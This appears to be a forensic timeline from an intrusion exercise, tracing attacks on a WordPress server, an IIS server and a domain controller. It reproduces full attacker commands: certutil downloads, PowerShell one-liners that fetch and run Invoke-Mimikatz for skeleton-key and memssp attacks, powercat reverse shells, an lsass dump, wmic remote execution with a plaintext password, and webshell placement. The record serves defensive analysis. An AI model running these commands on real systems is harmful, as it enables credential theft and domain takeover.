# windows ISS server
* 2020/8/4 AM 08:42:33 CVE-2020-0688 (awaiting to determinate)
```
c:\windows\system32\inetsrv\w3wp.exe -ap "ASP.NET v4.0" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipm127dc09c-653d-45f2-8d87-b91abf5fdbce -h "C:\inetpub\temp\apppools\ASP.NET v4.0\ASP.NET v4.0.config" -w "" -m 0 -t 20
```
* 2020/8/4 AM 08:48:26 create reverse shell by [powercat](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) to ip source ```10.20.3.88``` with role ```SYSTEM```

* 2020/8/4 AM 08:51:25 execute ```Sqldumper.exe  468 0 0x01100``` dumps the process with pid ```468```(probably ``` lsass.exe```)

* 2020/8/4 AM 09:12:51 execute ```certutil.exe  -urlcache -split -f http://192.168.1.2/nt.exe nt.exe``` to download ```nt.exe``` from ubuntu server

* 2020/8/4 AM 09:13 execute ```nt.exe``` with various parameter
    * -help
    * /h

* 2020/8/4 AM 09:16:02 execute ```certutil.exe  -urlcache -split -f http://192.168.1.2/bt.exe bt.exe``` to download ```bt.exe``` from ubuntu server

* 2020/8/4 AM 09:16:29 execute ```bt.exe 192.168.1.0/24``` in ```C:\Users\Public\Music\```

* 2020/8/5 AM 07:34:16 create reverse shell by [powercat](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) to ip source ```10.20.3.88```

* 2020/8/5 AM 08:58:20 create reverse shell by [powercat](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1) to ip source ```10.20.2.165```

* 2020/8/5 AM 09:07:15 download string from ```http://10.20.2.206/test.txt``` as ```test.aspx```


* 2020/8/5 PM 10:07:07 create [aspx webshell](https://raw.githubusercontent.com/tennc/webshell/master/aspx/AspxSpy2014Final.aspx) at ```inetpub/wwwroot/UmbracoCms/Umbraco```

* 2020/8/5 PM 10:25:34 RPC ```192.168.1.4``` via ```"c:\windows\system32\cmd.exe" /c wmic /node:192.168.1.4 /user:TEAMT5\Administrator /password:admin12345!!! process call create "ipconfig.exe"```


* 2020/8/5 PM 10:26:13 invoke Mimikatz via ```c:\windows\system32\cmd.exe" /c wmic process call create "powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'\"``` to create password skeleton key

* 2020/8/5 PM 10:26:25 invoke Mimikatz via ```wmic  process call create "powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::memssp'\""``` to modify ```lsass.exe```

* 2020/8/5 PM 10:27:32 ```"c:\windows\system32\cmd.exe" /c net use z: \\WIN-LN8SES7K1Q5\C$ /user:TEAMT5\Administrator mimikatz```

# ubuntu wordpress web server
* 03/Aug/2020:09:38:35, ```CVE-2019-9978``` and post shell, ```bt.exe```, ```nt.exe``` by ```10.20.3.131```

* 04/Aug/2020:08:49:26, start to ```sqlmap``` by ```10.20.2.227```

* 04/Aug/2020:09:16:31, tunnel (npv) start

* 04/Aug/2020:09:42:07, use tunnel scan internet

* 04/Aug/2020:09:45:56, login wordpress with admin account by ```10.20.2.165```

* 04/Aug/2020:10:23:15, use tunnel request ```http://192.168.1.3/Umbraco/aaaa.aspx``` it's old webshell

* 04/Aug/2020:22:15:48, use tunnel request ```http://192.168.1.2/admine21_decode.php``` I don't know what it mean

* 04/Aug/2020:23:04:21, use tunnel request ```http://192.168.1.3/umbraco/AspxSpy2014Final.aspx``` it's webshell

* 04/Aug/2020:23:07:16, use tunnel request ```http://192.168.1.3/umbraco/bbbb.aspx``` it's webshell

# windows dc server
* 2020/08/04:09:23:44, invoke Mimikatz via ```cmd.exe /Q /c IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'" 1> \\127.0.0.1\ADMIN$\__1596450222.629457 2>&1``` by ```WIN-LN8SES7K1Q5$```

* 2020/08/04:09:24:46, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::memssp'" ``` by ``` Administrator ```

* 2020/08/04:09:24:46, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::memssp'" ``` by ``` Administrator ```

* 2020/08/04:09:26:37, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'" ``` by ``` Administrator ```

* 2020/08/04:09:26:37, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'" ``` by ``` Administrator ```

* 2020/08/05:22:25:34, exec ipconfig.exe by ```TEAMT5\Administrator```

# how attack
* ubuntu wordpress web server : ```CVE-2019-9978``` to get webshell and ```sqlmap``` to get wropress admin account

* windows IIS server : ```CVE-2020-0688``` (awaiting to determinate) attack then create webshell

* windows dc server : in IIS server dump IIS server's lssas.exe and use Minikatz to get dc's admin 's account and password

# Horizon move
* ubuntu -> IIS : bt.ext and nt.exe

* IIS -> dc : create process ipconfig.exe